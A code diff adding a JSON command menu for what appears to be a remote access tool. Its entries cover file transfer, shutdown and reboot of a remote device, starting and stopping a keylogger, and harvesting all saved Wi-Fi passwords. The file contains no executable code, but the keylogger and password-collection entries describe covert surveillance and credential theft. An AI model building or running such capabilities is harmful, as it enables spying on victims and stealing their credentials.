@@ -1,0 +1,11 @@
+[
+    {"text":"download a file","cmd":"download \"filename\"","desc":"downloads a file from remote device"},
+    {"text":"upload a file","cmd":"upload \"filename\"","desc":"uploads a filte to remote device"},
+    {"text":"shutdown","cmd":"shutdown","desc":"poweroff remote device"},
+    {"text":"reboot","cmd":"reboot","desc":"restarts remote device"},
+    {"text":"shutdown with message","cmd":"shutdown_m \"message\"","desc":" shutdown remote device after showing a message"},
+    {"text":"shutdown with timer","cmd":"shutdown_t \"timer\"","desc":" shutdown remote device after specific time"},
+    {"text":"start keylogger","cmd":"keylogger_start","desc":"gets keystrikes on remote devices"},
+    {"text":"stop keylogger","cmd":"keylogger_stop","desc":"stops the running keylogger"},
+    {"text":"wifi passwords","cmd":"wifipass","desc":"collects all saved wireless networjk passwords"}
+]
